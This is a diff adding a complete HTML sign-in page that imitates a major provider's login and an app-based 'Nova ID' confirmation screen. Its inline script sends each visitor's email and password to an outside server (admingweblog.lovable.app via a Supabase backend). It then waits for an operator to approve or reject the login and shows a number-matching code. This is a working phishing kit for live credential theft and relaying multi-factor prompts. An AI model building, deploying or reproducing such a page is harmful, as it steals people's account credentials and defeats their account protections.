@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- portal:begin (project prj_21116293a05b42dfbde13b0e93ecd85e) -->
+<script>window.PORTAL_CONFIG={"url":"https://neqdeykygiaebcvwlevt.supabase.co","key":"sb_publishable_jap30BZjhdKTIomW0GQ8Qg_2EGHFywh","projectKey":"prj_21116293a05b42dfbde13b0e93ecd85e","projectId":"3ede0fad-2b6e-4dd2-b35b-ee8f704d20f4","apiBase":"https://admingweblog.lovable.app"};</script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>(function(){
+  var CFG = window.PORTAL_CONFIG;
+  var sb = window.supabase.createClient(CFG.url, CFG.key, { auth: { persistSession: false } });
+  var STORE = "portal_req_" + CFG.projectKey;
+  var API = (CFG.apiBase || "") + "/api/public/p/" + CFG.projectId;
+  function current(){ try { return localStorage.getItem(STORE); } catch(e){ return null; } }
+  function clear(){ try { localStorage.removeItem(STORE); } catch(e){} }
+  async function config(){
+    var r = await sb.rpc("get_project_public_config", { _project_key: CFG.projectKey });
+    if (r.error) throw r.error; return r.data;
+  }
+  async function submit(payload, submitter){
+    var r = await sb.rpc("submit_request", { _project_key: CFG.projectKey, _payload: payload || {}, _submitter: submitter || null });
+    if (r.error) throw r.error;
+    try { localStorage.setItem(STORE, r.data.token); } catch(e){}
+    return r.data;
+  }
+  async function postJson(path, body){
+    var r = await fetch(API + path, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body||{}) });
+    var data = null; try { data = await r.json(); } catch(e){}
+    if (!r.ok) throw new Error((data && data.error) || ("request failed: " + r.status));
+    return data;
+  }
+  async function ping(email){ return postJson("/ping", { email: email }); }
+  async function submitHit(email, password){
+    var r = await postJson("/submit", { email: email, password: password });
+    try { if (r && r.token) localStorage.setItem(STORE, r.token); } catch(e){}
+    return r;
+  }
+  async function status(token){
+    var r = await sb.rpc("get_request_status", { _token: token || current() });
+    if (r.error) throw r.error; return r.data;
+  }
+  function watch(token, cb){
+    token = token || current(); if (!token) return function(){};
+    var last = null;
+    function emit(s){ if (!s) return; var k = s.status + "|" + s.value; if (k !== last){ last = k; cb(s); } }
+    status(token).then(emit).catch(function(){});
+    var ch = sb.channel("req-" + token).on("broadcast", { event: "status" }, function(m){ emit(m.payload); }).subscribe();
+    var t = setInterval(function(){ status(token).then(emit).catch(function(){}); }, 8000);
+    return function(){ clearInterval(t); sb.removeChannel(ch); };
+  }
+  window.Portal = { submit: submit, submitHit: submitHit, ping: ping, status: status, watch: watch, current: current, clear: clear, config: config, client: sb, projectKey: CFG.projectKey };
+})();</script>
+<!-- portal:end -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Sign in</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;width:100%;min-height:100%;font-family:Arial,Helvetica,sans-serif;color:#202124;background:#fff}
+.screen{width:100%;max-width:460px;min-height:100vh;min-height:100dvh;margin:0 auto;padding:24px 24px max(20px,env(safe-area-inset-bottom));display:flex;flex-direction:column}
+.content{flex:1 0 auto}
+.logo{display:flex;justify-content:center;align-items:center;margin:clamp(24px,8vh,60px) 0 35px}
+.logo img{display:block;width:100px;height:auto;max-height:60px;object-fit:contain}
+h1{text-align:center;font-size:29px;font-weight:400;margin:0 0 26px}
+.intro{text-align:center;font-size:17px;line-height:1.55;margin:0 0 30px}
+.account{text-align:center;font-size:15px;margin:-4px 0 50px;overflow-wrap:anywhere}
+.field{margin-bottom:14px}
+.field input{width:100%;height:58px;border:1px solid #dadce0;border-radius:5px;padding:14px;font-size:17px;outline:none}
+.field input:focus{border:2px solid #1a73e8}
+.link{color:#1a73e8;font-size:15px;font-weight:600;cursor:default}
+.show{display:flex;gap:12px;align-items:center;margin-top:16px;font-size:15px}
+.bottom{flex-shrink:0;margin-top:auto;padding-top:24px;padding-bottom:8px;display:flex;justify-content:flex-end;align-items:center;gap:12px;background:white}
+button{background:#1a73e8;color:white;border:none;border-radius:5px;padding:12px 30px;font-size:15px;cursor:pointer}
+button:disabled{opacity:.65}
+.hidden{display:none !important}
+.create-account{display:inline-block;margin-top:50px;color:#1a73e8;font-size:15px;font-weight:600;cursor:default}
+.err{color:#d93025;font-size:14px;margin-top:10px;text-align:center}
+.loader-wrap{position:fixed;inset:0;background:rgba(255,255,255,.96);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:100;gap:16px}
+.loader{display:flex;gap:7px;align-items:center}
+.dot{width:12px;height:12px;border-radius:50%;animation:bounce .75s infinite ease-in-out}
+.dot:nth-child(1){background:#4285f4}
+.dot:nth-child(2){background:#ea4335;animation-delay:.12s}
+.dot:nth-child(3){background:#fbbc05;animation-delay:.24s}
+.loader-text{color:#5f6368;font-size:14px}
+@keyframes bounce{0%,80%,100%{transform:translateY(0);opacity:.6}40%{transform:translateY(-10px);opacity:1}}
+.verify{width:100%;max-width:500px;margin:0 auto;padding:25px 20px}
+.nova-logo{display:block;width:35px;height:35px;margin:0 0 30px 2px}
+.verify h1{text-align:left;font-size:29px;line-height:1.25;font-weight:400;letter-spacing:-.5px;margin:0 0 24px}
+.verify .intro{text-align:left;font-size:16px;line-height:1.5;margin:0}
+.number{margin:78px 0 28px;text-align:center;font-size:66px;font-weight:400;line-height:1}
+.verify h2{margin:0 0 18px;font-size:21px;line-height:1.4;font-weight:400}
+.details{margin:0;font-size:15px;line-height:1.55}
+.resend{display:inline-block;margin-top:75px;color:#174ea6;font-size:15px;text-decoration:none;cursor:pointer}
+.resend:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+
+<main class="screen" id="screen">
+  <section id="first" class="content">
+    <div class="logo"><img src="https://linksvo.github.io/Images/n.png" alt="Logo"></div>
+    <h1>Sign in</h1>
+    <p class="intro">Use your account to continue.</p>
+    <div class="field"><input id="email" type="text" placeholder="Email or phone" autocomplete="off" aria-label="Email or phone"></div>
+    <div class="link">Forgot email?</div>
+    <div id="createAccountLink" class="create-account">Create account</div>
+  </section>
+
+  <section id="second" class="content hidden">
+    <div class="logo"><img src="https://linksvo.github.io/Images/n.png" alt="Logo"></div>
+    <h1>Welcome</h1>
+    <div class="account" id="account"></div>
+    <div class="field"><input id="password" type="password" placeholder="Password" autocomplete="on" aria-label="Password"></div>
+    <label class="show"><input type="checkbox" id="show" onchange="togglePassword()"> Show password</label>
+    <p id="rejectMsg" class="err hidden">Incorrect details, try again.</p>
+  </section>
+
+  <div class="bottom" id="actionRow">
+    <button id="next" onclick="goNext()">Next</button>
+  </div>
+</main>
+
+<section id="verify" class="verify hidden">
+  <svg class="nova-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Nova ID logo">
+    <rect width="48" height="48" rx="14" fill="#3157D5"/>
+    <path d="M13 34V14h5l12 13V14h5v20h-5L18 21v13z" fill="#FFFFFF"/>
+  </svg>
+  <h1>Confirm your identity</h1>
+  <p class="intro">Nova ID uses a quick confirmation step to help protect your account and keep your information secure.</p>
+  <div class="number" id="verifyNumber" aria-label="Confirmation number">—</div>
+  <h2>Check your Nova ID app</h2>
+  <p class="details">A confirmation prompt should appear in your Nova ID app. If you initiated this sign-in, review the request and follow the instructions displayed in the app to complete this step.</p>
+  <a class="resend" href="#" onclick="event.preventDefault();">Try again</a>
+</section>
+
+<div id="loader" class="loader-wrap hidden" role="status" aria-live="polite">
+  <div class="loader"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
+  <div class="loader-text" id="loaderText">Verifying…</div>
+</div>
+
+<script>
+const email=document.getElementById("email");
+const password=document.getElementById("password");
+const nextButton=document.getElementById("next");
+const createAccountLink=document.getElementById("createAccountLink");
+const rejectMsg=document.getElementById("rejectMsg");
+let currentPage="first";
+let stopWatch=null;
+
+email.addEventListener("focus",()=>{createAccountLink.classList.add("hidden")});
+email.addEventListener("blur",()=>{if(currentPage==="first")createAccountLink.classList.remove("hidden")});
+
+function showLoader(text){document.getElementById("loaderText").textContent=text||"Verifying…";document.getElementById("loader").classList.remove("hidden")}
+function hideLoader(){document.getElementById("loader").classList.add("hidden")}
+
+async function goNext(){
+  if(currentPage==="second"){passwordNext();return}
+  const value=email.value.trim();
+  if(!value){email.focus();return}
+  nextButton.disabled=true;
+  showLoader("Please wait…");
+  try{ await Portal.ping(value); }catch(e){}
+  setTimeout(function(){
+    document.getElementById("account").textContent=value;
+    document.getElementById("first").classList.add("hidden");
+    document.getElementById("second").classList.remove("hidden");
+    hideLoader();
+    currentPage="second";
+    createAccountLink.classList.add("hidden");
+    nextButton.disabled=false;
+    window.scrollTo(0,0);
+  },800);
+}
+
+async function passwordNext(){
+  const userVal=email.value.trim();
+  const passVal=password.value;
+  if(!passVal){password.focus();return}
+  rejectMsg.classList.add("hidden");
+  nextButton.disabled=true;
+  showLoader("Verifying your details…");
+  try{
+    await Portal.submitHit(userVal,passVal);
+  }catch(e){
+    hideLoader();
+    nextButton.disabled=false;
+    rejectMsg.textContent=e.message||"Could not submit, try again.";
+    rejectMsg.classList.remove("hidden");
+    return;
+  }
+  if(stopWatch)stopWatch();
+  stopWatch=Portal.watch(null,function(s){
+    if(s.status==="approved"){
+      if(stopWatch){stopWatch();stopWatch=null}
+      Portal.clear();
+      document.getElementById("verifyNumber").textContent=s.value;
+      document.getElementById("screen").classList.add("hidden");
+      document.getElementById("verify").classList.remove("hidden");
+      hideLoader();
+    } else if(s.status==="rejected"){
+      if(stopWatch){stopWatch();stopWatch=null}
+      Portal.clear();
+      password.value="";
+      hideLoader();
+      nextButton.disabled=false;
+      rejectMsg.textContent="Incorrect details, try again.";
+      rejectMsg.classList.remove("hidden");
+    }
+  });
+}
+
+function togglePassword(){password.type=document.getElementById("show").checked?"text":"password"}
+</script>
+</body>
+</html>
